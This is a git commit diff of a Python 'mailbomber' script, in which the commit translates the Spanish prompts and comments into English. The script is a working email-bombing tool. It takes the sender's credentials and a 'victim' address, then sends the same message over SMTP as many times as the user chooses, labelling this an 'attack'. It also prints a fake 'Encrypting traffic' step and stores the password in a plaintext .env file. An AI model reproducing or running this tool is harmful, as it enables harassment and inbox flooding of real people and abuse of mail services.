7607c701aae687e792c37176434644d0897b8776
Juan Carlos Rodríguez <jcrr.developer@gmail.com>
2023-12-05 22:15:13 +0100

    Update mailbomber.py

--- mailbomber.py
+++ mailbomber.py
@@ -1,12 +1,12 @@
-#Author: 0xJuaNc4
+# Author: 0xJuaNc4
 
-#Módulos
+# Modules
 import os
 import smtplib
 from dotenv import load_dotenv
 from time import sleep
 
-#Paleta de colores
+# Color palette
 class Colors:
     GREEN = "\033[92m"
     RED = "\033[91m"
@@ -14,46 +14,46 @@ class Colors:
     YELLOW = "\033[33m"
     RESET = "\033[0m"
 
-#Banner
+# Banner
 def banner():
     os.system("cls" if os.name == "nt" else "clear")
     print(f"""{Colors.PURPLE}
     ╭━╮╭━╮╱╱╱╭╮╭━━╮╱╱╱╱╱╱╭╮
     ┃┃╰╯┃┃╱╱╱┃┃┃╭╮┃╱╱╱╱╱╱┃┃
     ┃╭╮╭╮┣━━┳┫┃┃╰╯╰┳━━┳╮╭┫╰━┳━━┳━╮
-    ┃┃┃┃┃┃╭╮┣┫┃┃╭━╮┃╭╮┃╰╯┃╭╮┃┃━┫╭╯  {Colors.RESET}(Hecho por {Colors.YELLOW}0xJuaNc4{Colors.RESET}){Colors.PURPLE}
+    ┃┃┃┃┃┃╭╮┣┫┃┃╭━╮┃╭╮┃╰╯┃╭╮┃┃━┫╭╯  {Colors.RESET}(Made by {Colors.YELLOW}0xJuaNc4{Colors.RESET}){Colors.PURPLE}
     ┃┃┃┃┃┃╭╮┃┃╰┫╰━╯┃╰╯┃┃┃┃╰╯┃┃━┫┃
     ╰╯╰╯╰┻╯╰┻┻━┻━━━┻━━┻┻┻┻━━┻━━┻╯
     {Colors.RESET}""")
     sleep(1)
 
-#Email bomber
+# Email bomber
 def send_email():
     num_counter = 0
-    sender_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce tu correo electrónico: "))
-    sender_passwd = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce la contraseña de aplicación: "))
-    victim_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce el correo electrónico víctima: "))
-    message = input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce el mensaje a enviar: ")
+    sender_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter your email address: "))
+    sender_passwd = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the application password: "))
+    victim_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the victim's e-mail address: "))
+    message = input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the message to send: ")
     try:
-        counter = int(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Número de correos a enviar: "))
+        counter = int(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Number of emails to be sent: "))
     except ValueError:
-        print(f"\n{Colors.RED}[!]{Colors.RESET} Entrada no válida, prueba otra vez con un número")
+        print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid entry, try again with a number")
         return
-    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Generando archivo {Colors.YELLOW}.env{Colors.RESET} con los datos introducidos")
+    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Generating {Colors.YELLOW}.env{Colors.RESET} file with entered data")
     with open(".env", "w") as env_file:
         env_file.write(f"USER={sender_email}\n")
         env_file.write(f"PASS={sender_passwd}")
     sleep(2)
-    print(f"\n{Colors.GREEN}[*]{Colors.RESET} Archivo {Colors.YELLOW}.env{Colors.RESET} creado con exito!")
+    print(f"\n{Colors.GREEN}[*]{Colors.RESET} {Colors.YELLOW}.env{Colors.RESET} file successfully created!")
     load_dotenv()
     sleep(2)
     banner()
-    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Resumen del ataque:")
-    print(f"\n{Colors.PURPLE}Remitente:{Colors.RESET} {sender_email}\n{Colors.PURPLE}Destinatario:{Colors.RESET} {victim_email}\n{Colors.PURPLE}Número de correos:{Colors.RESET} {counter}")
+    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Summary of the attack:")
+    print(f"\n{Colors.PURPLE}Sender:{Colors.RESET} {sender_email}\n{Colors.PURPLE}Target:{Colors.RESET} {victim_email}\n{Colors.PURPLE}Number of mailings:{Colors.RESET} {counter}")
     sleep(3)
-    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Encriptando el tráfico...")
+    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Encrypting traffic...")
     sleep(2)
-    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Iniciando el ataque...")
+    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Starting the attack...")
     sleep(2)
     banner()
     try:
@@ -63,20 +63,20 @@ def send_email():
             server.login(os.getenv("USER"), os.getenv("PASS"))
             server.sendmail(os.getenv("USER"), victim_email, message)
             num_counter+=1
-            print(f"\r{Colors.GREEN}[*]{Colors.RESET} Correo enviados existosamente: {Colors.YELLOW}{num_counter}{Colors.RESET}", end="", flush=True)
+            print(f"\r{Colors.GREEN}[*]{Colors.RESET} Successfully sent mail: {Colors.YELLOW}{num_counter}{Colors.RESET}", end="", flush=True)
             if counter == num_counter:
-                print(f"\n\n{Colors.YELLOW}[*]{Colors.RESET} {num_counter} correos enviados exitosamente a {Colors.PURPLE}{victim_email}{Colors.RESET}")
+                print(f"\n\n{Colors.YELLOW}[*]{Colors.RESET} {num_counter} emails successfully sent to {Colors.PURPLE}{victim_email}{Colors.RESET}")
     except Exception as e:
-        print(f"\n{Colors.RED}[!]{Colors.RESET} La información introducida es incorrecta, no se puede llevar a cabo el ataque")
+        print(f"\n{Colors.RED}[!]{Colors.RESET} The information entered is incorrect, the attack cannot be carried out.")
         print(e)
     
-#Programa principal
+# Main program
 if __name__ == "__main__":
     try:
         banner()
         send_email()
     except KeyboardInterrupt:
-        print(f"\n\n{Colors.RED}[!]{Colors.RESET} Saliendo...")
+        print(f"\n\n{Colors.RED}[!]{Colors.RESET} Exit...")
     finally:
         try:
             os.remove(".env")
